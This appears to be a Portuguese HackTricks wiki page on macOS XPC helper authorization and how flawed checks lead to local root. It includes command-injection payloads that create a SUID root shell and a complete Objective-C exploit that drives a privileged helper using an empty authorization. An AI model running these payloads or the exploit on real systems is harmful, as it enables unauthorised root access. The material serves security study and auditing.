# Autorização XPC do macOS

{{#include ../../../../../banners/hacktricks-training.md}}

## Autorização XPC

A Apple também propõe outra forma de autenticar se o processo que está se conectando tem **permissões para chamar o método XPC exposto**.

Quando uma aplicação precisa **executar ações como um usuário privilegiado**, em vez de executar o app como um usuário privilegiado, normalmente instala como root um HelperTool como um serviço XPC que pode ser chamado pelo app para realizar essas ações. No entanto, o app que chama o serviço deve ter autorização suficiente.

### ShouldAcceptNewConnection sempre YES

Um exemplo pode ser encontrado em [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). Em `App/AppDelegate.m`, ele tenta **se conectar** ao **HelperTool**. Já em `HelperTool/HelperTool.m`, a função **`shouldAcceptNewConnection`** **não verificará** nenhum dos requisitos indicados anteriormente. Ela sempre retornará YES:<sup>[[1]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Para obter mais informações sobre como configurar corretamente esta verificação:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Direitos do aplicativo

No entanto, há alguma **autorização ocorrendo quando um método do HelperTool é chamado**.

A função **`applicationDidFinishLaunching`** de `App/AppDelegate.m` criará uma referência de autorização vazia depois que o aplicativo for iniciado. Isso sempre deve funcionar.\
Em seguida, ela tentará **adicionar alguns direitos** a essa referência de autorização chamando `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
A função `setupAuthorizationRights` de `Common/Common.m` armazenará no banco de dados de autenticação `/var/db/auth.db` os direitos do aplicativo. Observe que ela adicionará apenas os direitos que ainda não estão no banco de dados:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
A função `enumerateRightsUsingBlock` é usada para obter as permissões dos aplicativos, que são definidas em `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Isso significa que, ao final desse processo, as permissões declaradas dentro de `commandInfo` serão armazenadas em `/var/db/auth.db`. Observe que ali você pode encontrar, para **cada método** que **exigirá autenticação**, o **nome da permissão** e o **`kCommandKeyAuthRightDefault`**. Este último **indica quem pode obter esse direito**.

Existem diferentes escopos para indicar quem pode acessar um direito. Alguns deles são definidos em [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (você pode encontrar [todos eles aqui](https://www.dssw.co.uk/reference/authorization-rights/)), mas, como resumo:

<table><thead><tr><th width="284.3333333333333">Nome</th><th width="165">Valor</th><th>Descrição</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Qualquer pessoa</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Ninguém</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>O usuário atual precisa ser um administrador (pertencer ao grupo de administradores)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Solicita que o usuário se autentique.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Solicita que o usuário se autentique. Ele precisa ser um administrador (pertencer ao grupo de administradores)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Especifica regras</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Especifica comentários adicionais sobre o direito</td></tr></tbody></table>

### Verificação de permissões

Em `HelperTool/HelperTool.m`, a função **`readLicenseKeyAuthorization`** verifica se o caller está autorizado a **executar esse método**, chamando a função **`checkAuthorization`**. Essa função verificará se os **`authData`** enviados pelo processo chamador têm um **formato correto** e, em seguida, verificará **o que é necessário para obter o direito** de chamar o método específico. Se tudo ocorrer bem, o **`error` retornado será `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Observe que, para **verificar os requisitos necessários para obter o direito** de chamar esse método, a função `authorizationRightForCommand` simplesmente verificará o objeto **`commandInfo`** mencionado anteriormente. Em seguida, ela chamará **`AuthorizationCopyRights`** para verificar **se possui os direitos** necessários para chamar a função (observe que os flags permitem a interação com o usuário).

Neste caso, para chamar a função `readLicenseKeyAuthorization`, `kCommandKeyAuthRightDefault` é definido como `@kAuthorizationRuleClassAllow`. Portanto, **qualquer pessoa pode chamá-la**.

### Informações do DB

Foi mencionado que essas informações são armazenadas em `/var/db/auth.db`. Você pode listar todas as regras armazenadas com:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Então, você pode ler quem pode acessar o direito com:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Permissões permissivas

Você pode encontrar **todas as configurações de permissões** [**aqui**](https://www.dssw.co.uk/reference/authorization-rights/), mas as combinações que não exigirão interação do usuário seriam:

1. **'authenticate-user': 'false'**
- Esta é a chave mais direta. Se definida como `false`, especifica que um usuário não precisa fornecer autenticação para obter este direito.
- Isso é usado **em combinação com uma das 2 opções abaixo ou indicando um grupo** ao qual o usuário deve pertencer.
2. **'allow-root': 'true'**
- Se um usuário estiver operando como o usuário root (que possui permissões elevadas) e esta chave estiver definida como `true`, o usuário root poderá obter este direito sem autenticação adicional. No entanto, normalmente, obter o status de usuário root já exige autenticação, portanto, para a maioria dos usuários, este não é um cenário de "sem autenticação".
3. **'session-owner': 'true'**
- Se definida como `true`, o proprietário da sessão (o usuário atualmente conectado) obteria automaticamente este direito. Isso pode ignorar uma autenticação adicional se o usuário já estiver conectado.
4. **'shared': 'true'**
- Esta chave não concede direitos sem autenticação. Em vez disso, se definida como `true`, significa que, depois que o direito tiver sido autenticado, ele poderá ser compartilhado entre vários processos sem que cada um precise se autenticar novamente. No entanto, a concessão inicial do direito ainda exigiria autenticação, a menos que combinada com outras chaves, como `'authenticate-user': 'false'`.

Você pode [**usar este script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) para obter os direitos interessantes:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Estudos de Caso de Bypass de Autorização

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: O serviço privilegiado do Mach `com.acustica.HelperTool` aceita todas as conexões, e sua rotina `checkAuthorization:` chama `AuthorizationCopyRights(NULL, …)`, portanto qualquer blob de 32 bytes é aceito. Em seguida, `executeCommand:authorization:withReply:` envia strings separadas por vírgulas e controladas pelo atacante para o `NSTask` como root, possibilitando payloads como:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
criar trivialmente um shell SUID root. Detalhes neste [write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).<sup>[[6]](#references)</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: O listener sempre retorna YES, e o mesmo padrão NULL de `AuthorizationCopyRights` aparece em `checkAuthorization:`. O método `exchangeAppWithReply:` concatena a entrada do atacante em uma string `system()` duas vezes; portanto, injetar shell metacharacters em `appPath` (por exemplo, `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) resulta em execução de código como root por meio do Mach service `com.plugin-alliance.pa-installationhelper`. Mais informações [aqui](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).<sup>[[7]](#references)</sup>
- **CVE-2024-4395 – Jamf Compliance Editor helper**: A execução de uma auditoria cria `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, expõe o Mach service `com.jamf.complianceeditor.helper` e exporta `-executeScriptAt:arguments:then:` sem verificar o `AuthorizationExternalForm` ou a code signature do caller. Um exploit trivial cria um `AuthorizationCreate` com uma referência vazia, conecta-se com `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` e invoca o método para executar binários arbitrários como root. As notas completas de reversing (incluindo o PoC) estão no [write-up de Mykola Grymalyuk](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).<sup>[[4]](#references)</sup>
- **CVE-2025-25251 – FortiClient Mac helper**: O FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 e 7.4.0–7.4.2 aceitava mensagens XPC manipuladas que alcançavam um helper privilegiado sem authorization gates. Como o helper confiava em seu próprio `AuthorizationRef` privilegiado, qualquer usuário local capaz de enviar mensagens ao service podia induzi-lo a executar alterações arbitrárias de configuração ou comandos como root. Detalhes no [resumo do advisory da SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).<sup>[[5]](#references)</sup>

#### Dicas para triagem rápida

- Quando um app inclui uma GUI e um helper, compare seus requisitos de código e verifique se `shouldAcceptNewConnection` bloqueia o listener com `-setCodeSigningRequirement:` (ou valida `SecCodeCopySigningInformation`). A ausência dessas verificações geralmente resulta em cenários CWE-863, como no caso do Jamf. Uma verificação rápida seria:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Compare o que o helper *acredita* estar autorizando com o que o cliente fornece. Ao fazer reversing, defina um breakpoint em `AuthorizationCopyRights` e confirme que o `AuthorizationRef` se origina de `AuthorizationCreateFromExternalForm` (fornecido pelo cliente), em vez do próprio contexto privilegiado do helper; caso contrário, provavelmente você encontrou um padrão de CWE-863 semelhante aos casos acima.

## Reversing de Authorization

### Verificando se EvenBetterAuthorization é usado

Se você encontrar a função: **`[HelperTool checkAuthorization:command:]`**, provavelmente o processo está usando o schema de authorization mencionado anteriormente:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Isso significa que, se essa função chamar funções como `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights` e `AuhtorizationFree`, ela estará usando [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Verifique o **`/var/db/auth.db`** para descobrir se é possível obter permissões para chamar alguma ação privilegiada sem interação do usuário.

### Comunicação do Protocol

Em seguida, você precisa encontrar o schema do protocol para conseguir estabelecer uma comunicação com o serviço XPC.

A função **`shouldAcceptNewConnection`** indica o protocol que está sendo exportado:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

Neste caso, temos o mesmo que em EvenBetterAuthorizationSample; [**verifique esta linha**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Sabendo o nome do protocol usado, é possível **dump a definição do header** com:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Por fim, precisamos apenas saber o **nome do Mach Service exposto** para estabelecer uma comunicação com ele. Existem várias maneiras de descobrir isso:

- Em **`[HelperTool init]`**, onde é possível ver o Mach Service sendo usado:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- No plist do launchd:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Example

Neste exemplo, são criados:

- A definição do protocol com as funções
- Um auth vazio para solicitar acesso
- Uma conexão com o XPC service
- Uma chamada para a função caso a conexão seja bem-sucedida
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Outros privilege helpers XPC explorados

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[[8]](#references)</sup>

## Referências

- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([mirror no GitHub](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Authorization Services](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395: Privilege Escalation no Jamf Compliance Editor](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251: Falha de Privilege Escalation no FortiClient Mac](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 – Local Privilege Escalation no serviço Acustica Audio HelperTool XPC do Aquarius Desktop no macOS](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 – Local Privilege Escalation no serviço InstallationHelper XPC do Plugin Alliance](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805: Privilege Escalation no Apple EndpointSecurity framework (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

{{#include ../../../../../banners/hacktricks-training.md}}
